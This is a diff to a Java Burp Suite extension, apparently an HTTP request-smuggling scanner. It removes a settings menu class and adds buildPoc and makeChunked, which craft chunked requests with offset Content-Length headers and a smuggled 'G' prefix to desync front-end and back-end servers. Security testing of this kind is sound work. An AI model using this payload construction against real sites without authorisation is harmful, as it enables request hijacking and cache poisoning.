@@ -15,232 +15,7 @@ import java.util.List;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.stream.Collectors;
-
-class ConfigMenu implements Runnable, MenuListener, IExtensionStateListener{
-    private JMenu menuButton;
-
-    ConfigMenu() {
-        Utilities.callbacks.registerExtensionStateListener(this);
-    }
-
-    public void run()
-    {
-        menuButton = new JMenu("Param Miner");
-        menuButton.addMenuListener(this);
-        JMenuBar burpMenuBar = Utilities.getBurpFrame().getJMenuBar();
-        burpMenuBar.add(menuButton);
-    }
-
-    public void menuSelected(MenuEvent e) {
-        SwingUtilities.invokeLater(new Runnable() {
-            public void run(){
-                Utilities.globalSettings.showSettings();
-            }
-        });
-    }
-
-    public void menuDeselected(MenuEvent e) { }
-
-    public void menuCanceled(MenuEvent e) { }
-
-    public void extensionUnloaded() {
-        JMenuBar jMenuBar = Utilities.getBurpFrame().getJMenuBar();
-        jMenuBar.remove(menuButton);
-        jMenuBar.repaint();
-    }
-}
-
-interface ConfigListener {
-    void valueUpdated(String value);
-}
-
-class ConfigurableSettings {
-    private LinkedHashMap<String, String> settings;
-    private NumberFormatter onlyInt;
-
-    private HashMap<String, ConfigListener> callbacks = new HashMap<>();
-
-    public void registerListener(String key, ConfigListener listener) {
-        callbacks.put(key, listener);
-    }
-
-    ConfigurableSettings() {
-        settings = new LinkedHashMap<>();
-        put("thread pool size", 8);
-
-        put("use key", true);
-        put("key method", true);
-        put("key status", true);
-        put("key content-type", true);
-        put("key server", true);
-        put("key header names", false);
-
-        // smuggle-scan specific
-        put("try chunk-truncate", true);
-        put("try timeout-diff", true);
-        put("poc: G", true);
-        put("poc: headerConcat", true);
-        put("poc: bodyConcat", true);
-        put("poc: collab", true);
-        put("poc: collab-header", true);
-
-        put("avoid rescanning vulnerable hosts", false);
-
-        for(String key: settings.keySet()) {
-            //Utilities.callbacks.saveExtensionSetting(key, null); // purge saved settings
-            String value = Utilities.callbacks.loadExtensionSetting(key);
-            if (Utilities.callbacks.loadExtensionSetting(key) != null) {
-                putRaw(key, value);
-            }
-        }
-
-        NumberFormat format = NumberFormat.getInstance();
-        onlyInt = new NumberFormatter(format);
-        onlyInt.setValueClass(Integer.class);
-        onlyInt.setMinimum(-1);
-        onlyInt.setMaximum(Integer.MAX_VALUE);
-        onlyInt.setAllowsInvalid(false);
-
-    }
-
-    private ConfigurableSettings(ConfigurableSettings base) {
-        settings = new LinkedHashMap<>(base.settings);
-        onlyInt = base.onlyInt;
-    }
-
-    void printSettings() {
-        for(String key: settings.keySet()) {
-            Utilities.out(key + ": "+settings.get(key));
-        }
-    }
-
-    static JFrame getBurpFrame()
-    {
-        for(Frame f : Frame.getFrames())
-        {
-            if(f.isVisible() && f.getTitle().startsWith(("Burp Suite")))
-            {
-                return (JFrame) f;
-            }
-        }
-        return null;
-    }
-
-    private String encode(Object value) {
-        String encoded;
-        if (value instanceof Boolean) {
-            encoded = String.valueOf(value);
-        }
-        else if (value instanceof Integer) {
-            encoded = String.valueOf(value);
-        }
-        else {
-            encoded = "\"" + ((String) value).replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
-        }
-        return encoded;
-    }
-
-    private void putRaw(String key, String value) {
-        settings.put(key, value);
-        ConfigListener callback = callbacks.getOrDefault(key, null);
-        if (callback != null) {
-            callback.valueUpdated(value);
-        }
-    }
-
-    private void put(String key, Object value) {
-        putRaw(key, encode(value));
-    }
-
-    String getString(String key) {
-        String decoded = settings.get(key);
-        decoded = decoded.substring(1, decoded.length()-1).replace("\\\"", "\"").replace("\\\\", "\\");
-        return decoded;
-    }
-
-    int getInt(String key) {
-        return Integer.parseInt(settings.get(key));
-    }
-
-    boolean getBoolean(String key) {
-        String val = settings.get(key);
-        if ("true".equals(val)) {
-            return true;
-        }
-        else if ("false".equals(val)){
-            return false;
-        }
-        throw new RuntimeException("Not boolean or not found: "+key);
-    }
-
-    private String getType(String key) {
-        String val = settings.get(key);
-        if (val.equals("true") || val.equals("false")) {
-            return "boolean";
-        }
-        else if (val.startsWith("\"")) {
-            return "string";
-        }
-        else {
-            return "number";
-        }
-    }
-
-    ConfigurableSettings showSettings() {
-        JPanel panel = new JPanel();
-        panel.setLayout(new GridLayout(0, 2));
-
-        HashMap<String, Object> configured = new HashMap<>();
-
-        for(String key: settings.keySet()) {
-            String type = getType(key);
-            panel.add(new JLabel("\n"+key+": "));
-
-            if (type.equals("boolean")) {
-                JCheckBox box = new JCheckBox();
-                box.setSelected(getBoolean(key));
-                panel.add(box);
-                configured.put(key, box);
-            }
-            else if (type.equals("number")){
-                JTextField box = new JFormattedTextField(onlyInt);
-                box.setText(String.valueOf(getInt(key)));
-                panel.add(box);
-                configured.put(key, box);
-            }
-            else {
-                JTextField box = new JTextField(getString(key));
-                panel.add(box);
-                configured.put(key, box);
-            }
-        }
-
-        int result = JOptionPane.showConfirmDialog(Utilities.getBurpFrame(), panel, "Attack Config", JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);
-        if (result == JOptionPane.OK_OPTION) {
-            for(String key: configured.keySet()) {
-                Object val = configured.get(key);
-                if (val instanceof JCheckBox) {
-                    val = ((JCheckBox) val).isSelected();
-                }
-                else if (val instanceof JFormattedTextField) {
-                    val = Integer.parseInt(((JFormattedTextField) val).getText().replaceAll("[^-\\d]", ""));
-                }
-                else {
-                    val = ((JTextField) val).getText();
-                }
-                put(key, val);
-                Utilities.callbacks.saveExtensionSetting(key, encode(val));
-            }
-
-            return new ConfigurableSettings(this);
-        }
-
-        return null;
-    }
-
-
-
-}
+import java.util.zip.GZIPOutputStream;
 
 class Utilities {
 
@@ -312,6 +87,61 @@ class Utilities {
                 return "unknown";
         }
     }
+
+    static Resp buildPoc(byte[] req, IHttpService service) {
+        try {
+            byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
+            badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0);
+
+            ByteArrayOutputStream buf = new ByteArrayOutputStream();
+            buf.write(badMethodIfChunked);
+            buf.write("G".getBytes());
+
+            // first request ends here
+            buf.write(makeChunked(req, 0, 0));
+            return new Resp(new Req(buf.toByteArray(), null, service));
+        }
+        catch (IOException e) {
+            throw new RuntimeException();
+        }
+    }
+
+    static byte[] gzipBody(byte[] baseReq) {
+        try {
+            byte[] req = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "gzip");
+            String body = Utilities.getBody(req);
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            GZIPOutputStream gzip = new GZIPOutputStream(out);
+            gzip.write(Utilities.helpers.stringToBytes(body));
+            gzip.close();
+            return Utilities.setBody(req, Utilities.helpers.bytesToString(out.toByteArray()));
+        } catch (Exception e) {
+            Utilities.err(e.getMessage());
+            return baseReq;
+        }
+    }
+
+    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
+        if (!Utilities.containsBytes("Transfer-Encoding".getBytes(), baseReq)) {
+            baseReq = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "foo");
+        }
+
+        byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");
+        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
+        String body = Utilities.getBody(baseReq);
+        int chunkSize = bodySize+chunkOffset;
+        if (chunkSize > 0) {
+            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n0\r\n\r\n");
+        }
+        else {
+            chunkedReq = Utilities.setBody(chunkedReq, "0\r\n\r\n");
+        }
+        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
+        String newContentLength = Integer.toString(bodySize+contentLengthOffset);
+        chunkedReq = Utilities.setHeader(chunkedReq, "Content-Length", newContentLength);
+        return chunkedReq;
+    }
+
 
     static int generate(int seed, int count, List<String> accumulator)
     {
